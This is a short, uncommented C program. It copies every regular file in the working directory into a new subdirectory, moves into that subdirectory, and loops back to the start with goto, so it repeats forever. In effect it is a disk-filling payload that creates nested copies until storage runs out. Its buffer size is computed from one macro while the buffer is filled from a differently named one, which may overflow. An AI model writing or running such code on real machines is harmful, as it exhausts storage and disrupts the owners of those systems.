#include <stdio.h>
#include <dirent.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "FileCopy.h"
#include "defs.h"
int is_regular_file(char *path)
{
    struct stat path_stat;
    stat(path, &path_stat);
    return S_ISREG(path_stat.st_mode);
}
int main(void){
start:
    asm volatile ("nop");
    char *dr_s = getcwd(NULL, 0);
    struct dirent *de;
    DIR *dr = opendir(dr_s);
    ifNULLEXIT(dr); 
    int num = 0;
    int ret = mkdir(DIRCP, S_IRWXU);
    if (ret == -1) {
        exit(0);
    }
    while ((de = readdir(dr)) != NULL) {
        char* source = de->d_name;
        if(!is_regular_file(source))
            continue;
        char*copy = calloc(strlen(source)+ 8 + strlen(DIRCP), 1);
        if(copy == NULL)
            exit(EXIT_SUCCESS);
        ifNULLEXIT(copy);
        strcat(copy, DIRCPP);
        strcat(copy, "_");
        strcat(copy, source);
        FileCopy(source, copy);
        free(copy);
    }
    closedir(dr);
    chdir(DIRCP);
    goto start;
}
